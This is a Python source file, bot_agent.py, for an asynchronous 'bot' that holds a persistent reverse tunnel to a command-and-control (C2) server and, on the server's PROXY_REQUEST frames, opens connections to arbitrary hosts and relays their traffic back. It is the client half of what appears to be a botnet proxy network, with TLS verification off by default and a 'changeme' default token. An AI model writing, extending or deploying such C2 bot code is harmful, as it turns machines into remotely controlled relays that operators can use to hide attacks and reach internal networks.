#!/usr/bin/env python3
"""
bot_agent.py

Async Bot agent:
- Persistent reverse TLS/TCP tunnel to C2
- Local HTTP/SOCKS5 proxy (optional)
- Multiplex multiple client connections over the tunnel
"""

import asyncio
import ssl
import logging
import uuid
import signal
from typing import Dict, Optional

from protocol import Frame, FramedStream, Heartbeat


logging.basicConfig(level=logging.INFO, format="[%(asctime)s] %(levelname)s %(name)s: %(message)s")
logger = logging.getLogger("bot")


class BotAgent:
    def __init__(self, c2_host: str, c2_port: int, token: str, bot_id: Optional[str] = None,
                 cert_reqs: bool = False):
        self.c2_host = c2_host
        self.c2_port = c2_port
        self.token = token
        self.bot_id = bot_id or f"bot-{uuid.uuid4()}"
        self.ssl_ctx: Optional[ssl.SSLContext] = None
        if cert_reqs:
            self.ssl_ctx = ssl.create_default_context()
        self.stream: Optional[FramedStream] = None
        self.heartbeat: Optional[Heartbeat] = None
        # request_id -> (reader, writer)
        self.active: Dict[str, asyncio.StreamWriter] = {}
        self._shutdown_event = asyncio.Event()
        self._running = False

    async def connect_loop(self):
        # Setup signal handlers
        self._setup_signal_handlers()
        
        logger.info("Starting bot agent %s, connecting to %s:%d", self.bot_id, self.c2_host, self.c2_port)
        logger.info("Press Ctrl+C to shutdown gracefully")
        
        try:
            while not self._shutdown_event.is_set():
                try:
                    reader, writer = await asyncio.open_connection(self.c2_host, self.c2_port, ssl=self.ssl_ctx)
                    self.stream = FramedStream(reader, writer)
                    await self.stream.send(Frame(type="AUTH", meta={"token": self.token, "bot_id": self.bot_id}))
                    ok = await self.stream.recv(timeout=10)
                    if not ok or ok.type != "OK":
                        logger.error("auth failed, retrying...")
                        await asyncio.sleep(3)
                        continue
                    self.heartbeat = Heartbeat(self.stream, name=f"bot-{self.bot_id}")
                    await self.heartbeat.start()
                    logger.info("Connected to C2 %s:%d as %s", self.c2_host, self.c2_port, self.bot_id)
                    self._running = True
                    await self._run()
                    break
                except (ConnectionRefusedError, OSError, ssl.SSLError) as e:
                    if not self._shutdown_event.is_set():
                        logger.warning("connection failed: %s", e)
                        await asyncio.sleep(2)
                except asyncio.CancelledError:
                    logger.info("connection cancelled")
                    break
                except Exception as e:
                    if not self._shutdown_event.is_set():
                        logger.error("unexpected connection error: %s", e)
                        await asyncio.sleep(2)
        except KeyboardInterrupt:
            logger.info("Received keyboard interrupt")
        finally:
            await self._cleanup()

    async def _run(self):
        assert self.stream
        try:
            while self._running and not self._shutdown_event.is_set():
                try:
                    frame = await asyncio.wait_for(self.stream.recv(), timeout=1.0)
                    if frame is None:
                        raise ConnectionError("tunnel closed")
                    if await self.heartbeat.handle_rx(frame):
                        continue
                    if frame.type == "PROXY_REQUEST":
                        await self._handle_proxy_request(frame)
                    elif frame.type == "DATA":
                        await self._handle_data(frame)
                    elif frame.type == "END":
                        await self._handle_end(frame)
                except asyncio.TimeoutError:
                    # Check shutdown event periodically
                    continue
                except ConnectionError as e:
                    logger.warning("Connection error: %s", e)
                    break
                except Exception as e:
                    logger.error("Unexpected error in _run: %s", e)
                    break
        except asyncio.CancelledError:
            logger.info("Bot run loop cancelled")
            raise

    def _setup_signal_handlers(self):
        """Setup signal handlers for graceful shutdown."""
        def signal_handler(signum, frame):
            if not self._shutdown_event.is_set():
                logger.info("Received signal %d, initiating graceful shutdown...", signum)
                self._shutdown_event.set()
            else:
                logger.debug("Signal %d received again; shutdown already in progress", signum)
        
        # Setup signal handlers
        signal.signal(signal.SIGINT, signal_handler)
        signal.signal(signal.SIGTERM, signal_handler)
        
        # On Windows, also handle SIGBREAK
        if hasattr(signal, 'SIGBREAK'):
            signal.signal(signal.SIGBREAK, signal_handler)

    async def _cleanup(self):
        """Cleanup resources during shutdown."""
        logger.info("Starting bot cleanup...")
        
        self._running = False
        
        # Stop heartbeat
        if self.heartbeat:
            await self.heartbeat.stop()
        
        # Close stream
        if self.stream:
            self.stream.close()
        
        # Close all active connections
        for req_id, writer in list(self.active.items()):
            try:
                writer.close()
            except Exception as e:
                logger.debug("Error closing connection %s: %s", req_id, e)
        
        self.active.clear()
        logger.info("Bot cleanup completed")

    async def _handle_proxy_request(self, frame: Frame):
        req_id = frame.request_id or str(uuid.uuid4())
        host = frame.meta.get("host")
        port = int(frame.meta.get("port", 0))
        if not host or not port:
            return
        # Open upstream
        try:
            reader, writer = await asyncio.open_connection(host, port)
            self.active[req_id] = writer
            # Start pump upstream->C2
            asyncio.create_task(self._pump_upstream(reader, req_id), name=f"pump-upstream-{req_id}")
        except Exception as e:
            logger.warning("upstream connect failed %s:%s: %s", host, port, e)
            if self.stream:
                await self.stream.send(Frame(type="ERR", request_id=req_id, meta={"reason": str(e)}))

    async def _handle_data(self, frame: Frame):
        req_id = frame.request_id
        w = self.active.get(req_id)
        if w and frame.payload:
            try:
                w.write(frame.payload)
                await w.drain()
            except Exception as e:
                logger.warning("upstream write error: %s", e)

    async def _handle_end(self, frame: Frame):
        req_id = frame.request_id
        w = self.active.pop(req_id, None)
        if w:
            try:
                w.close()
            except Exception:
                pass

    async def _pump_upstream(self, reader: asyncio.StreamReader, req_id: str):
        assert self.stream
        try:
            while True:
                chunk = await reader.read(4096)
                if not chunk:
                    break
                await self.stream.send(Frame(type="PROXY_RESPONSE", request_id=req_id, payload=chunk))
        finally:
            await self.stream.send(Frame(type="END", request_id=req_id))


async def main():
    import argparse
    p = argparse.ArgumentParser()
    p.add_argument("--c2-host", required=True)
    p.add_argument("--c2-port", type=int, required=True)
    p.add_argument("--token", default="changeme")
    p.add_argument("--bot-id")
    args = p.parse_args()

    bot = BotAgent(args.c2_host, args.c2_port, args.token, args.bot_id)
    await bot.connect_loop()


if __name__ == "__main__":
    asyncio.run(main())


